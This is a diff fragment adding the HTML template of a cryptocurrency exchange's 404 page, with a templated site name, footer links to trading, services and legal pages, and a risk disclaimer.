+            <path d="M199.682 44.3338C200.704 44.3338 201.533 43.5443 201.533 42.5705C201.533 41.5966 200.704 40.8071 199.682 40.8071C198.659 40.8071 197.83 41.5966 197.83 42.5705C197.83 43.5443 198.659 44.3338 199.682 44.3338Z" fill="#C2D1FF"></path>
+            <path d="M205.236 56.2364C207.232 56.2364 208.851 54.6575 208.851 52.7098C208.851 50.762 207.232 49.1831 205.236 49.1831C203.24 49.1831 201.621 50.762 201.621 52.7098C201.621 54.6575 203.24 56.2364 205.236 56.2364Z" fill="#C2D1FF"></path>
+        </svg>
+
+        <div class="not-found__title">Page not Found</div>
+
+        <a href="../.." class="buttons__02">Homepage</a>
+    </div>
+</main>
+<footer class="footer">
+    <div class="footer__container">
+        <div class="footer__top">
+            <div class="footer__info">
+                <div class="footer__logo">
+                    <div class="footer__logo-top">
+                        <div class="footer__logo-icon">
+                            <img style="width: 39px; margin-bottom: -3px;" th:src="${site_icon}">
+                        </div>
+                        <div class="footer__logo-text" th:text="${site_name}"></div>
+                    </div>
+                    <div class="footer__logo-line">
+                        <svg width="169" height="18" viewbox="0 0 169 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M21.2248 4.81993C23.8867 4.70895 26.0204 5.76327 27.2835 7.99677C28.2398 9.70312 29.3174 9.99445 31.1015 9.37018C35.683 7.76788 40.2859 6.22108 44.9173 4.77831C47.7861 3.88352 50.3552 4.36212 52.4604 6.74129C52.967 7.31008 54.2016 7.68465 54.9795 7.53205C58.9758 6.7413 62.9364 5.74245 66.9113 4.82685C71.3787 3.80027 75.8317 2.68354 80.3347 1.80955C83.1107 1.26852 85.7369 2.32977 87.4425 4.31357C89.9259 7.19216 92.9659 7.05342 96.0345 6.38753C101.822 5.13899 107.51 3.48815 113.283 2.17718C116.237 1.51129 119.277 1.01879 122.303 0.859255C123.688 0.782956 125.3 1.44885 126.506 2.22572C129.061 3.8627 131.887 3.74478 134.578 3.46039C142.035 2.66964 149.492 1.77487 156.864 0.463899C160.911 -0.257482 164.2 1.24769 167.619 2.59334C168.297 2.86386 169.181 4.32745 168.967 4.72975C168.461 5.68004 167.462 6.60257 166.434 7.00488C165.563 7.3517 164.279 7.1991 163.351 6.85228C158.534 5.04189 153.867 6.73436 149.157 7.26846C143.362 7.92048 137.596 8.80832 131.794 9.31468C130.046 9.46728 127.855 9.19676 126.499 8.25342C122.788 5.67309 119.042 6.52626 115.224 7.40718C109.122 8.81526 103.049 10.3205 96.9622 11.7771C91.9454 12.9771 87.5424 12.11 83.7459 8.43377C82.9323 7.64302 81.1197 7.19216 79.9779 7.45574C74.4758 8.69735 69.038 10.2234 63.5787 11.6661C59.9035 12.6303 56.2997 14.2118 52.3747 12.769C51.8895 12.5886 51.2971 12.5054 50.9403 12.1863C47.1153 8.74591 43.383 10.6187 39.5865 12.2557C36.9603 13.3863 34.3199 14.5169 31.5867 15.3424C28.1542 16.3828 25.5423 15.0927 23.0232 11.5759C22.1383 10.3343 21.3604 9.82798 19.8333 10.1262C15.3588 10.9863 11.4838 13.0326 7.99416 15.7724C4.83279 18.2626 2.41358 18.7551 0.401143 16.7921C-0.0555794 16.3481 -0.148338 14.7528 0.25843 14.3921C5.06115 10.0846 14.1385 5.18061 21.2391 4.82685L21.2248 4.81993Z" fill="#6544C6"></path>
+                        </svg>
+                    </div>
+                </div>
+                <div class="footer__description">
+                    Innovative cryptocurrency exchange with advanced financial services. We rely on blockchain technology to provide everything you need for wise trading and investment.
+                </div>
+                <br><br>
+                <div class="footer__label">Subscribe to our newsletter</div>
+                <div class="footer__wrapper">
+                    <input class="footer__input" type="email" placeholder="Enter email">
+                    <a class="footer__sing-up" id="footer_subscribe" href="#">
+                        Subscribe
+                    </a>
+                </div>
+            </div>
+            <div class="footer__links">
+                <div class="footer__links-block">
+                    <div class="footer__link-title">
+                        Products
+                    </div>
+                    <div class="footer__links-wrapper">
+                        <a class="footer__link" href="../trading">Spot trading</a>
+                        <a class="footer__link butafor__btn" href="../profile/wallet">Futures trading</a>
+                        <a class="footer__link butafor__btn" href="../profile/wallet">Options trading</a>
+                        <a class="footer__link" href="../profile/wallet">Wallet</a>
+                        <a class="footer__link" href="../profile/swap">Instant swap</a>
+                        <a class="footer__link" href="../profile/p2p">P2P trading</a>
+                        <a class="footer__link" href="../profile/staking">DeFi Staking</a>
+                        <a class="footer__link" href="../profile/cards" th:text="${site_name} + ' Visa Card'"></a>
+                    </div>
+                </div>
+                <div class="footer__links-block">
+                    <div class="footer__link-title">
+                        Services
+                    </div>
+                    <div class="footer__links-wrapper">
+                        <a class="footer__link" href="../profile/support">24/7 Support chat</a>
+                        <a class="footer__link" href="../profile/copy-trading">Copy trading</a>
+                        <a class="footer__link" href="../profile/trading-bots">Trading bots</a>
+                        <a class="footer__link" href="../profile/stake-eth20">ETH 2.0 staking</a>
+                        <a class="footer__link" href="../profile/launchpad">Launchpad</a>
+                        <a class="footer__link" href="../profile/savings">Savings</a>
+                        <a class="footer__link" href="../profile/ventures" th:text="${site_name} + ' ventures'"></a>
+                        <a class="footer__link" href="../profile/buy-crypto">Buy crypto</a>
+                    </div>
+                </div>
+                <div class="footer__links-block">
+                    <div class="footer__link-title">
+                        Information
+                    </div>
+                    <div class="footer__links-wrapper">
+                        <a class="footer__link" href="../fees">Fees</a>
+                        <a class="footer__link" href="../profile/status">Platform status</a>
+                        <a class="footer__link" href="../profile/wallet-security">Wallet security</a>
+                        <a class="footer__link" href="../indices">Indices</a>
+                        <a class="footer__link" href="../profile/api-docs">Trading API</a>
+                        <a class="footer__link" href="../profile/token-listing">Token listing</a>
+                        <a class="footer__link" href="../profile/space">Referral system</a>
+                        <a class="footer__link" href="../bugbounty">Bug Bounty</a>
+                    </div>
+                </div>
+                <div class="footer__links-block">
+                    <div class="footer__link-title">
+                        Legal
+                    </div>
+                    <div class="footer__links-wrapper">
+                        <a class="footer__link" href="../terms">Terms of service</a>
+                        <a class="footer__link" href="../privacy-notice">Privacy notice</a>
+                        <a class="footer__link" href="../cookies-policy">Cookies policy</a>
+                        <a class="footer__link" href="../aml-kyc-policy">AML & KYC policy</a>
+                        <a class="footer__link" href="../risk">Risk Disclosure Statement</a>
+                        <a class="footer__link" href="../regulatory">Regulatory License</a>
+                        <a class="footer__link" href="../treatment">Special Treatment</a>
+                        <a class="footer__link" href="../law">Law Enforcement Requests</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer__bottom">
+            <div class="footer__sub-text">
+                In acceding to or using the Platform and the Site, you represent and warrant that you are fully aware of the risks associated with the transactions involving Digital Assets or the use of Platform. You agree and understand that you are solely responsible for determining the nature, potential value, suitability, and appropriateness of these risks for yourself, and that the Company does not give advice or recommendations regarding any Digital Asset, including the suitability and appropriateness of, and investment strategies for, any Digital Asset. You agree and understand that you access and use the Platform and the Site at your own risk. <br>
+                <span th:text="${site_name} + ' 2024 © All right reserved'"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- END FOOTER -->
+<script src="../assets/js/jquery-3.4.1.min.js"></script>
+<script src="../assets/js/app.min.js"></script>
+</body>
+</html>
